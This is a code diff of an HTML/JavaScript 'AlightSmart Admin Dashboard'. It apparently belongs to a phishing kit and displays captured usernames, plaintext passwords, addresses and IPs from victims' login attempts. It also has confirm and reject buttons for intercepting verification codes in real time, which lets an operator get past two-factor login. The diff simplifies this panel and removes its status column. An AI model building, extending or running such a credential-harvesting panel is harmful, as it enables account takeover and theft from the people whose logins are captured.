@@ -17,14 +17,14 @@
         .reject-btn { background: #ef4444; color: white; }
         .refresh-btn { background: #3b82f6; color: white; }
         .clear-btn { background: #64748b; color: white; }
-        .pending { background: #fefce8; font-weight: bold; }
+        .pending { background: #fefce8; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password:  | Manual Code Confirmation</p>
+            <p>Password:</p>
         </div>
 
         <table id="recordsTable">
@@ -34,9 +34,8 @@
                     <th>Type</th>
                     <th>Username</th>
                     <th>Password</th>
-                    <th>Verification Details</th>
+                    <th>Full Details</th>
                     <th>IP</th>
-                    <th>Status</th>
                     <th>Action</th>
                 </tr>
             </thead>
@@ -59,36 +58,25 @@
             tbody.innerHTML = "";
 
             records.forEach(r => {
-                let status = r.status || 'Pending';
                 let action = '';
-
-                if (r.type === "Login Attempt" && status === 'Pending') {
+                if (r.type === "Login Attempt") {
                     action = `
-                        <button class="confirm-btn" onclick="updateStatus(${r.id}, 'Confirmed')">✅ Confirm Code</button>
-                        <button class="reject-btn" onclick="updateStatus(${r.id}, 'Rejected')">❌ Reject Code</button>
+                        <button class="confirm-btn" onclick="alert('Code Confirmed - User can proceed!')">✅ Confirm</button>
+                        <button class="reject-btn" onclick="alert('Code Rejected - User must try again')">❌ Reject</button>
                     `;
                 }
 
                 tbody.innerHTML += `
-                    <tr class="${status === 'Pending' ? 'pending' : ''}">
+                    <tr>
                         <td>${r.timestamp}</td>
                         <td>${r.type}</td>
                         <td><strong>${r.username || '-'}</strong></td>
                         <td><code>${r.password || '-'}</code></td>
                         <td>${r.address || '-'}</td>
                         <td>${r.ip || '-'}</td>
-                        <td>${status}</td>
                         <td>${action}</td>
                     </tr>`;
             });
-        }
-
-        async function updateStatus(id, status) {
-            if (confirm(`Mark this code as ${status}?`)) {
-                // For now we update the status in UI. You can extend later to update DB.
-                alert(`Code ${status}. User will be notified.`);
-                loadRecords();
-            }
         }
 
         window.onload = () => {
